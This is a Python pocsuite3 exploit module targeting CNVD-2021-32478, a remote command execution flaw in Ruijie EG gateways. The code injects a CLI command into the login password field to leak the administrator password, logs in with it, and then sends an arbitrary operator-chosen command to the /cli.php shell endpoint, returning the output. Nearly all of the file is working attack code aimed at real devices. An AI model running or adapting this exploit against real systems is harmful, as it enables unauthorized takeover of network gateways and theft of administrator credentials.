from pocsuite3.api import register_poc, POCBase, logger
from collections import OrderedDict
from pocsuite3.lib.core.interpreter_option import OptString
import requests
from urllib.parse import urljoin
import re


class EXP(POCBase):
    cnvd = "CNVD-2021-32478"
    name = "锐捷 EG易网关 cli.php 远程命令执行漏洞"
    vulDate = "2021年6月30日"
    appName = "ruijie"
    vulType = "Remote Code Execute"
    OPTIONS = OrderedDict({"command": OptString("id", "自定义执行指令")})

    def _attack(self):
        getinfo_url = urljoin(self.url, "/login.php")
        vuln_url = urljoin(self.url, "/cli.php?a=shell")
        s = requests.session()
        command = self.get_option('command')
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = "username=admin&password=admin?show+webmaster+user"
        res = s.post(getinfo_url, headers=headers, data=data, verify=False, timeout=5)
        if "data" in res.text and res.status_code == 200:
            password = re.findall(r'admin (.*?)"', res.text)[0]
            logger.debug(f'username:admin password:{password}')
            data = 'username=admin&password={}'.format(password)
            login_res = s.post(getinfo_url, data=data, headers=headers, verify=False, timeout=5)
            res_text = login_res.json()
            if login_res.status_code == 200 and res_text['data'] == '0':
                data = "notdelay=true&command={0}".format(command)
            vuln_res = s.post(vuln_url, data=data, headers=headers, verify=False)
            vuln_text = vuln_res.json()
            if vuln_res.status_code == 200 and 'true' in vuln_res.text:
                return self.parse_output({'VerifyInfo': {command: vuln_text['data']}})


register_poc(EXP)

if __name__ == "__main__":
    import os

    os.environ.setdefault('http', 'http://127.0.0.1:7890')
    os.environ.setdefault('http', 'http://127.0.0.1:7890')
    exp = EXP()
    logger.setLevel(level="DEBUG")
    exp.set_option("url", "https://127.0.0.1:4430")
    exp.set_option("command", "whoami")
    exp.execute(mode="attack")
